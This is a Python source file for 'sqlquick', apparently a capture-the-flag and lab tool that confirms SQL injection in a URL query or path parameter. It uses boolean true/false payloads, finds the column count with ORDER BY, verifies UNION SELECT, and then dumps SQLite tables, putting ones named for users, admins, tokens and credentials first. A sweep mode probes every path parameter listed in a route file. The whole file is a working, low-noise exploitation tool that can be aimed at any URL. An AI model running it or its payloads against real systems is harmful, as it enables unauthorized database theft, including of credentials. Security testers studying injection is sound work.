#!/usr/bin/env python3
"""sqlquick.py — low-volume SQLi fast-track for one parameter, before sqlmap.

sqlmap is thorough and loud: dozens of requests per technique, easy to trip a lab's
rate limiter before you even know there's a bug. This does the minimum needed to go
from "maybe" to "confirmed, here's the data": one baseline, one quote, a handful of
boolean true/false pairs (stopping at the first strong differential instead of trying
every closing form), a binary-searched ORDER BY boundary, a numbered UNION SELECT to
verify it, then a bounded, priority-ordered SQLite dump through that UNION.

    python3 sqlquick.py --url "https://target/api/search?q=widget" --token "$TOKEN"
    python3 sqlquick.py --url "https://target/api/items?id=1&sort=name" --param id

**Path parameters are injectable too, and are the easiest position to miss.** A REST id
sits in the path, not the query string, so there is no `--param` to name and a quote
probe against it proves nothing: `/api/products/1'` returning "not found" is exactly
what a *bound* integer does when the id fails to match. Target one with `--path-param`
(injects the last path segment, using its current value as the seed) or by marking the
position with `*`:

    python3 sqlquick.py --url "https://target/api/products/1" --path-param
    python3 sqlquick.py --url "https://target/api/products/*/reviews" --seed 1

`--sweep` triages every path parameter at once straight off jsharvest's methods.txt —
3-5 probes each, numeric differential first then a quoted-string form — and prints the
ready-to-run command for anything that answers. Run it before authenticating; it is the
cheapest way to find the one route that concatenates.

    python3 sqlquick.py --sweep --base https://target --methods recon/methods.txt

A quote producing a DB error is never reported as SQLi on its own — only a true/false
behavioural differential confirms it. Every request is rate-limited (0.55s default
delay) and 429s get two backoff retries (~3s, ~6s); if throttling persists past that,
the run aborts as inconclusive rather than reporting a false negative.

Options:
  --url URL           target URL; query param in its query string, or a `*` marker /
                      --path-param to inject a path segment
  --param NAME        which query param to inject; inferred if the URL has exactly one
  --path-param        inject the final path segment instead of a query parameter
  --seed VALUE        override the seed value injected around (default: current value, else 1)
  --sweep             triage mode: numeric differential over every path param
  --base URL          --sweep only: target root
  --methods FILE      --sweep only: jsharvest/jsmine methods.txt ('-' for stdin)
  --token / --cookie / --header "K: V" (repeatable)
  --out DIR           save every response here (default: sqlquick_out)
  --delay S           inter-request delay, default 0.55
  --retries N         429 backoff retries, default 2
  --max-cols N        upper bound for the ORDER BY binary search, default 30
  --max-rows N        row cap per dumped table, default 200
  --dump-all          dump every table, not just priority-matching ones (off by default)
"""
import argparse
import hashlib
import os
import re
import secrets
import sys
import time
from urllib.parse import parse_qsl, quote, unquote, urlencode, urlsplit, urlunsplit

import requests

requests.packages.urllib3.disable_warnings()

FLAG_RE = re.compile(r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,90}\}', re.I)
DBERR_RE = re.compile(
    r'sqlite3\.|SQLITE_ERROR|unrecognized token|near ".*"\s*:\s*syntax error|'
    r'sql syntax|ORA-\d{4,5}|pg_query|syntax error at or near|'
    r'unclosed quotation mark|OLE DB|mysql_fetch|Warning: mysql|'
    r'SqlException|System\.Data\.SqlClient|PDOException|database error',
    re.I)

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")

PRIORITY_KEYWORDS = ("flag", "secret", "config", "setting", "user", "admin",
                      "token", "note", "credential", "account")

# {seed} closes any string/paren context left open by the app's own query and the
# trailing comment eats whatever the app appends after our injected value.
FORMS = {
    "numeric":     "{seed} {sql}",
    "numeric-cmt": "{seed} {sql}--",
    "string-sq":   "{seed}' {sql}--",
    "paren":       "{seed}) {sql}--",
}

# Marks the injection point inside a URL path, e.g. /api/products/*/reviews.
PATH_MARKER = "*"

# Suppresses the app's own rows before a UNION. A /resource/:id endpoint returns a
# single row, so `1 UNION SELECT <payload>` hands back the *legitimate* product and the
# payload row is never seen -- the extraction silently yields nothing on exactly the
# endpoint shape path-parameter injection targets. Emptying the left-hand side first
# makes the UNION row the only candidate, whatever the seed.
EMPTY_PREFIX = {
    "numeric":     "AND 1=2 ",
    "numeric-cmt": "AND 1=2 ",
    "string-sq":   "AND '1'='2' ",
    "paren":       "AND 1=2 ",
}

# --sweep pairs: a true condition that must keep the baseline response, and a false
# condition that must change it. Numeric first because a REST id is nearly always an
# integer context, where a quote probe is meaningless.
SWEEP_FORMS = (
    ("numeric",   "{seed} AND 1=1",        "{seed} AND 1=2"),
    ("string-sq", "{seed}' AND '1'='1",    "{seed}' AND '1'='2"),
)


class RateLimited(Exception):
    pass


class Prober:
    def __init__(self, sess, base_url, param, headers, out_dir, delay, retries):
        self.sess = sess
        self.base_url = base_url
        self.param = param
        self.headers = headers
        self.out_dir = out_dir
        self.delay = delay
        self.retries = retries
        self.probes = 0
        self.http_requests = 0
        self.throttle_events = 0
        self.saved = 0
        self.flags = {}

    def url_for(self, value):
        parts = urlsplit(self.base_url)
        if self.param is None:
            # Path-parameter mode: substitute the marked segment. Percent-encode the
            # payload so spaces and quotes survive as one segment instead of being
            # read as a new path component or a query string.
            path = parts.path.replace(PATH_MARKER, quote(str(value), safe=""), 1)
            return urlunsplit((parts.scheme, parts.netloc, path, parts.query, parts.fragment))
        q = parse_qsl(parts.query, keep_blank_values=True)
        q = [(k, value if k == self.param else v) for k, v in q]
        return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))

    def send(self, url, tag):
        """One logical probe. May cost more than one HTTP request to 429 backoff."""
        self.probes += 1
        last = None
        for attempt in range(self.retries + 1):
            self.http_requests += 1
            try:
                r = self.sess.get(url, headers=self.headers, timeout=20,
                                   allow_redirects=False, verify=False)
            except Exception as e:
                last = e
                break
            last = r
            if r.status_code != 429:
                break
            self.throttle_events += 1
            if attempt < self.retries:
                wait = 3 * (attempt + 1)          # ~3s, then ~6s
                print("[!] 429 on %s — backing off %ds (retry %d/%d)"
                      % (tag, wait, attempt + 1, self.retries))
                time.sleep(wait)
        time.sleep(self.delay)
        self.save(tag, url, last)
        if isinstance(last, requests.Response) and last.status_code == 429:
            raise RateLimited("persistent 429 on probe %r (%s)" % (tag, url))
        return evidence(last)

    def save(self, tag, url, resp):
        self.saved += 1
        fn = os.path.join(self.out_dir, "%03d_%s.txt" % (self.saved, safe_name(tag)))
        with open(fn, "w", encoding="utf-8") as fh:
            fh.write("URL: %s\n" % url)
            if isinstance(resp, Exception):
                fh.write("ERROR: %s\n" % resp)
                return
            fh.write("HTTP %s\n" % resp.status_code)
            for k, v in resp.headers.items():
                fh.write("%s: %s\n" % (k, v))
            fh.write("\n" + (resp.text or ""))
        if isinstance(resp, requests.Response):
            for f in scan_flags(resp):
                self.flags.setdefault(f, []).append(tag)


def safe_name(s):
    return re.sub(r'[^a-zA-Z0-9]+', '_', s).strip('_')[:60] or "req"


def scan_flags(resp):
    hits = set(FLAG_RE.findall(resp.text or ""))
    for k, v in resp.headers.items():
        hits |= set(FLAG_RE.findall("%s: %s" % (k, v)))
    return hits


def evidence(resp):
    if isinstance(resp, Exception) or resp is None:
        return {"status": 0, "size": 0, "rows": None, "dberr": False, "text": ""}
    text = resp.text or ""
    rows = None
    try:
        j = resp.json()
        if isinstance(j, list):
            rows = len(j)
        elif isinstance(j, dict):
            for v in j.values():
                if isinstance(v, list):
                    rows = len(v)
                    break
    except Exception:
        pass
    return {"status": resp.status_code, "size": len(resp.content or b""),
            "rows": rows, "dberr": bool(DBERR_RE.search(text[:2000])), "text": text}


def resembles(a, b):
    if a["dberr"] or b["dberr"]:
        return a["dberr"] == b["dberr"]
    if a["rows"] is not None and b["rows"] is not None:
        return a["rows"] == b["rows"]
    return (a["status"] == b["status"]
            and abs(a["size"] - b["size"]) <= max(20, 0.05 * max(a["size"], b["size"], 1)))


def differs(a, b):
    return not resembles(a, b)


def infer_param(url, given):
    if given:
        return given
    q = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    if len(q) == 1:
        return q[0][0]
    if not q:
        sys.exit("[!] URL has no query parameters — for a REST id in the path use "
                 "--path-param, or mark the position with * (e.g. /api/products/*)")
    sys.exit("[!] URL has %d query params (%s) — pass --param to pick one"
              % (len(q), ", ".join(k for k, _ in q)))


def resolve_target(url, given_param, path_param, given_seed):
    """Work out what gets injected. Returns (param_or_None, seed, template_url).

    param is None for path-parameter mode, where the template URL carries a PATH_MARKER
    that url_for() substitutes.
    """
    parts = urlsplit(url)
    if PATH_MARKER in parts.path or path_param:
        path, seed = parts.path, given_seed or "1"
        if PATH_MARKER not in path:
            segs = path.rstrip("/").split("/")
            if len(segs) < 2 or not segs[-1]:
                sys.exit("[!] --path-param needs a final path segment to inject, "
                         "e.g. /api/products/1")
            if not given_seed:
                seed = unquote(segs[-1])
            segs[-1] = PATH_MARKER
            path = "/".join(segs)
        tmpl = urlunsplit((parts.scheme, parts.netloc, path, parts.query, parts.fragment))
        return None, seed, tmpl
    param = infer_param(url, given_param)
    seed = given_seed or dict(parse_qsl(parts.query, keep_blank_values=True)).get(param, "1")
    return param, seed, url


def path_templates(path):
    """Yield one template per {...} placeholder, that one marked and the rest set to 1.

    /api/products/{...}/reviews yields the product-id position, which a sweep that only
    handled a trailing placeholder would never test.
    """
    spans = [m.span() for m in re.finditer(r"\{[^}]*\}", path)]
    for i in range(len(spans)):
        out, last = [], 0
        for j, (s, e) in enumerate(spans):
            out.append(path[last:s])
            out.append(PATH_MARKER if j == i else "1")
            last = e
        out.append(path[last:])
        yield "".join(out), i


def parse_methods(fh):
    """Read 'METHOD /path' lines, tolerating jsmine's indented METHOD -> PATH section."""
    seen, out = set(), []
    for line in fh:
        line = line.strip()
        m = re.match(r"^(GET|POST|PUT|PATCH|DELETE|HEAD)\s+(/\S*)$", line)
        if not m:
            continue
        key = (m.group(1), m.group(2))
        if key not in seen:
            seen.add(key)
            out.append(key)
    return out


def compose(form, seed, sql):
    return FORMS[form].format(seed=seed, sql=sql)


def order_by_boundary(pr, form, seed, base_ev, max_cols):
    lo, hi, last_ok = 1, max_cols, 0
    while lo <= hi:
        mid = (lo + hi) // 2
        ev = pr.send(pr.url_for(compose(form, seed, "ORDER BY %d" % mid)), "orderby-%d" % mid)
        ok = not ev["dberr"] and resembles(ev, base_ev)
        print("    ORDER BY %-3d -> %s" % (mid, "ok" if ok else "error/differs"))
        if ok:
            last_ok = mid
            lo = mid + 1
        else:
            hi = mid - 1
    return last_ok


def union_sql(form, cols):
    return EMPTY_PREFIX.get(form, "") + "UNION SELECT " + ",".join(cols)


def union_verify(pr, form, seed, col_count, start_tok, end_tok):
    marker = "%sOK%s" % (start_tok, end_tok)
    for pos in range(col_count):
        cols = ["NULL"] * col_count
        cols[pos] = "'%s'" % marker
        ev = pr.send(pr.url_for(compose(form, seed, union_sql(form, cols))),
                     "union-verify-col%d" % pos)
        if marker in ev["text"]:
            return pos
    return None


def sqlite_extract(pr, form, seed, col_count, payload_col, start_tok, end_tok, sql_expr):
    cols = ["NULL"] * col_count
    cols[payload_col] = "('%s' || COALESCE((%s),'') || '%s')" % (start_tok, sql_expr, end_tok)
    ev = pr.send(pr.url_for(compose(form, seed, union_sql(form, cols))), "extract")
    m = re.search(re.escape(start_tok) + r'(.*?)' + re.escape(end_tok), ev["text"], re.S)
    return m.group(1) if m else None


def is_priority(name):
    low = name.lower()
    return any(k in low for k in PRIORITY_KEYWORDS)


def sweep_one(pr, seed_candidates):
    """Numeric-then-string boolean differential on one marked position.

    Returns (verdict, form, seed) where verdict is "injectable", "clean", or
    "no-baseline". A quote is never consulted: the whole point is that a bound integer
    and a concatenated one look identical to a quote probe.

    "no-baseline" matters as much as the other two. If every candidate id 404s -- an
    orders/:id scoped to another user, say -- then nothing was ever tested, and
    reporting that as clean is the "negative from behind a tripped guard" mistake.
    """
    for seed in seed_candidates:
        base = pr.send(pr.url_for(seed), "sweep-base-%s" % seed)
        if base["status"] >= 400 or base["size"] == 0:
            continue                      # id doesn't exist; try the next one
        for form, t_tpl, f_tpl in SWEEP_FORMS:
            t = pr.send(pr.url_for(t_tpl.format(seed=seed)), "sweep-%s-true" % form)
            if not resembles(t, base):
                continue                  # true condition already broke it: not this form
            f = pr.send(pr.url_for(f_tpl.format(seed=seed)), "sweep-%s-false" % form)
            if differs(f, t):
                return "injectable", form, seed
        return "clean", None, seed        # baseline was usable; no need to try more seeds
    return "no-baseline", None, None


def run_sweep(a, headers):
    """Triage every path parameter in methods.txt for a boolean differential."""
    src = sys.stdin if a.methods == "-" else open(a.methods, encoding="utf-8", errors="replace")
    try:
        entries = parse_methods(src)
    finally:
        if src is not sys.stdin:
            src.close()

    base = a.base.rstrip("/")
    targets = []
    for method, path in entries:
        if method != "GET" or "{" not in path:
            continue
        for tmpl, pos in path_templates(path):
            targets.append((path, pos, base + tmpl))
    if not targets:
        print("[*] no GET route with a path parameter in %s — nothing to sweep" % a.methods)
        print("    (routes with {...} placeholders are the only ones this mode tests)")
        return 0

    print("[*] sweeping %d path parameter position(s) for a boolean differential" % len(targets))
    print("[*] numeric first (`1 AND 1=1` vs `1 AND 1=2`), then a quoted-string form\n")
    seeds = [a.seed] if a.seed else ["1", "2", "3"]
    hits, untested = [], []
    for path, pos, tmpl in targets:
        pr = Prober(requests.Session(), tmpl, None, headers, a.out, a.delay, a.retries)
        label = "%s [param %d]" % (path, pos + 1)
        try:
            verdict, form, seed = sweep_one(pr, seeds)
        except RateLimited as e:
            print("  %-46s THROTTLED — inconclusive (%s)" % (label, e))
            untested.append((label, "throttled"))
            continue
        if verdict == "injectable":
            print("  %-46s *** INJECTABLE (%s, seed %s)" % (label, form, seed))
            hits.append((tmpl, seed))
        elif verdict == "no-baseline":
            print("  %-46s UNTESTED — no id in %s returned a body"
                  % (label, "/".join(seeds)))
            untested.append((label, "no usable id"))
        else:
            print("  %-46s no differential (seed %s)" % (label, seed))

    print("\n" + "=" * 78)
    if untested:
        print("%d position(s) UNTESTED, not cleared — rerun with --seed <an id you own>:"
              % len(untested))
        for label, why in untested:
            print("    %-44s (%s)" % (label, why))
    if not hits:
        print("no path parameter showed a boolean differential")
        print("NOTE: only GET path params were tested. Query params, POST bodies and")
        print("      headers are NOT covered — a clean sweep does not clear those.")
        return 0
    print("%d injectable path parameter(s) — confirm and dump with:" % len(hits))
    for tmpl, seed in hits:
        print("  python3 %s --url '%s' --seed %s%s"
              % (os.path.basename(__file__), tmpl, seed,
                 ' --token "$TOKEN"' if a.token else ""))
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url")
    ap.add_argument("--param")
    ap.add_argument("--path-param", action="store_true",
                    help="inject the final path segment instead of a query parameter")
    ap.add_argument("--seed", help="value to inject around (default: current value, else 1)")
    ap.add_argument("--sweep", action="store_true",
                    help="triage every path parameter in --methods for a differential")
    ap.add_argument("--base", help="--sweep only: target root")
    ap.add_argument("--methods", help="--sweep only: methods.txt ('-' for stdin)")
    ap.add_argument("--token")
    ap.add_argument("--cookie")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--out", default="sqlquick_out")
    ap.add_argument("--delay", type=float, default=0.55)
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--max-cols", type=int, default=30)
    ap.add_argument("--max-rows", type=int, default=200)
    ap.add_argument("--dump-all", action="store_true")
    a = ap.parse_args()

    if a.sweep:
        if not (a.base and a.methods):
            ap.error("--sweep needs --base and --methods")
    elif not a.url:
        ap.error("--url is required (or use --sweep with --base/--methods)")

    os.makedirs(a.out, exist_ok=True)

    headers = {"User-Agent": UA, "Accept": "application/json, */*"}
    if a.token:
        headers["Authorization"] = "Bearer " + a.token
    if a.cookie:
        headers["Cookie"] = a.cookie
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    if a.sweep:
        sys.exit(run_sweep(a, headers))

    param, seed, target = resolve_target(a.url, a.param, a.path_param, a.seed)
    if param is None:
        print("[*] target: path parameter in %s   seed value: %r" % (target, seed))
    else:
        print("[*] target param: %s   seed value: %r" % (param, seed))

    pr = Prober(requests.Session(), target, param, headers, a.out, a.delay, a.retries)

    try:
        base_ev = pr.send(pr.url_for(seed), "baseline")
        print("[*] baseline: status=%s size=%s rows=%s dberr=%s"
              % (base_ev["status"], base_ev["size"], base_ev["rows"], base_ev["dberr"]))

        quote_ev = pr.send(pr.url_for(seed + "'"), "quote")
        quote_signal = quote_ev["dberr"] or differs(quote_ev, base_ev)
        print("[*] seed+quote: status=%s size=%s dberr=%s  (signal=%s, not proof by itself)"
              % (quote_ev["status"], quote_ev["size"], quote_ev["dberr"], quote_signal))

        winning_form = None
        for form in FORMS:
            true_ev = pr.send(pr.url_for(compose(form, seed, "AND 1=1")), "%s-true" % form)
            false_ev = pr.send(pr.url_for(compose(form, seed, "AND 1=2")), "%s-false" % form)
            strong = (differs(true_ev, false_ev)
                      and resembles(true_ev, base_ev)
                      and not resembles(false_ev, base_ev))
            print("[*] closing form %-12s true(status=%s,size=%s,rows=%s) "
                  "false(status=%s,size=%s,rows=%s) -> %s"
                  % (form, true_ev["status"], true_ev["size"], true_ev["rows"],
                     false_ev["status"], false_ev["size"], false_ev["rows"],
                     "STRONG DIFFERENTIAL" if strong else "no differential"))
            if strong:
                winning_form = form
                break                          # stop at the first strong differential

        if not winning_form:
            verdict = ("suspicious but unconfirmed (quote produced a DB-error-shaped "
                       "response, no boolean differential)" if quote_signal else
                       "no evidence of SQL injection on this parameter")
            print("\nRESULT: %s" % verdict)
            print("probes=%d  http_requests=%d  saved=%d" % (pr.probes, pr.http_requests, pr.saved))
            return 0

        print("\n[+] confirmed via boolean differential, closing form=%s" % winning_form)
        print("[*] finding column count (binary search, cap=%d)..." % a.max_cols)
        col_count = order_by_boundary(pr, winning_form, seed, base_ev, a.max_cols)
        if col_count == 0:
            print("RESULT: boolean differential confirmed, but ORDER BY 1 already errors — "
                  "cannot determine column count, stopping short of UNION verification")
            return 0
        if col_count == a.max_cols:
            print("[!] column count hit --max-cols (%d) — actual count may be higher, "
                  "re-run with a larger --max-cols" % a.max_cols)
        print("[+] column count: %d" % col_count)

        # Printable, random, all-alnum tokens — not raw control bytes: a JSON response
        # escapes char(31)/char(30)/char(29) to a literal ""-style 6-char sequence,
        # so a delimiter that has to survive a transport encoding needs to already be text.
        # Each delimiter is bracketed by '~' so it never ends on an alphanumeric.
        # FLAG_RE begins (?<![A-Za-z0-9]) to avoid matching mid-identifier in a JS
        # bundle; with a bare hex delimiter a dumped flag reads as "...C4A2F1bug{...}"
        # and that lookbehind suppresses it, so a flag sitting in a dumped column was
        # written to dump_<table>.txt and never announced. '~' is unreserved in a URL
        # path and safe inside a SQL string literal.
        start_tok = "~Q" + secrets.token_hex(4).upper() + "~"
        end_tok = "~Q" + secrets.token_hex(4).upper() + "~"
        list_sep = "~L" + secrets.token_hex(3).upper() + "~"
        col_sep = "~C" + secrets.token_hex(3).upper() + "~"
        row_sep = "~R" + secrets.token_hex(3).upper() + "~"
        payload_col = union_verify(pr, winning_form, seed, col_count, start_tok, end_tok)
        if payload_col is None:
            print("RESULT: boolean differential + column count confirmed, but UNION SELECT "
                  "marker never came back — verification failed, stopping short of extraction")
            print("probes=%d  http_requests=%d  saved=%d" % (pr.probes, pr.http_requests, pr.saved))
            return 0
        print("[+] UNION SELECT verified, marker landed in column %d" % payload_col)

        tables_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                      start_tok, end_tok,
                                      # char(37) is '%'. A literal percent cannot be used
                                      # here: URL-encoded as %25 inside a path segment it
                                      # is rejected with a 400 by proxies/CDNs in front of
                                      # the app, so the whole extraction silently returns
                                      # nothing in --path-param mode.
                                      "SELECT group_concat(name, '%s') FROM sqlite_master "
                                      "WHERE type='table' AND name NOT LIKE 'sqlite_'||char(37)"
                                      % list_sep)
        tables = [t for t in (tables_blob or "").split(list_sep) if t]
        print("[*] %d table(s): %s" % (len(tables), ", ".join(tables)))

        priority = [t for t in tables if is_priority(t)]
        rest = [t for t in tables if t not in priority]
        todo = priority if not a.dump_all else priority + rest
        if not a.dump_all and not priority:
            print("[*] no table name matched the priority keywords "
                  "(%s) — nothing to dump by default, re-run with --dump-all"
                  % ", ".join(PRIORITY_KEYWORDS))

        for table in todo:
            if not re.match(r'^[A-Za-z0-9_]+$', table):
                continue
            cols_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                        start_tok, end_tok,
                                        "SELECT group_concat(name, '%s') FROM pragma_table_info('%s')"
                                        % (list_sep, table))
            columns = [c for c in (cols_blob or "").split(list_sep) if c]
            if not columns:
                print("  [-] %s: could not enumerate columns, skipping" % table)
                continue
            col_expr = (" || '%s' || " % col_sep).join(
                "COALESCE(CAST(%s AS TEXT),'')" % c for c in columns)
            rows_sql = ("SELECT group_concat(rowblob, '%s') FROM "
                        "(SELECT (%s) AS rowblob FROM %s LIMIT %d)"
                        % (row_sep, col_expr, table, a.max_rows))
            rows_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                        start_tok, end_tok, rows_sql)
            rows = [r.split(col_sep) for r in (rows_blob or "").split(row_sep) if r]
            dump_path = os.path.join(a.out, "dump_%s.txt" % safe_name(table))
            with open(dump_path, "w", encoding="utf-8") as fh:
                fh.write(",".join(columns) + "\n")
                for row in rows:
                    fh.write(",".join(row) + "\n")
            print("  [+] %s: %d column(s), %d row(s) -> %s" % (table, len(columns), len(rows), dump_path))
            # Scan the parsed cells, not the raw blob: a cell has clean boundaries, so
            # a flag occupying a whole column value can't be masked by an adjacent
            # delimiter however the separators are generated.
            found = set()
            for row in rows:
                for cell in row:
                    found |= scan_flags_text(cell)
            if found:
                for f in found:
                    print("      FLAG: %s" % f)
                if not a.dump_all:
                    print("[*] flag found — stopping priority-table extraction")
                    break

    except RateLimited as e:
        print("\n[!] %s" % e)
        print("RESULT: inconclusive due to rate limiting")
        print("probes=%d  http_requests=%d (incl. retries)  throttle_events=%d  saved=%d"
              % (pr.probes, pr.http_requests, pr.throttle_events, pr.saved))
        return 2

    print("\n" + "=" * 70)
    if pr.flags:
        for f, where in pr.flags.items():
            print("FLAG: %s   <- %s" % (f, ", ".join(where[:4])))
    print("probes=%d  http_requests=%d (incl. retries)  throttle_events=%d  saved=%d"
          % (pr.probes, pr.http_requests, pr.throttle_events, pr.saved))
    return 0


def scan_flags_text(text):
    return set(FLAG_RE.findall(text or ""))


if __name__ == "__main__":
    sys.exit(main())
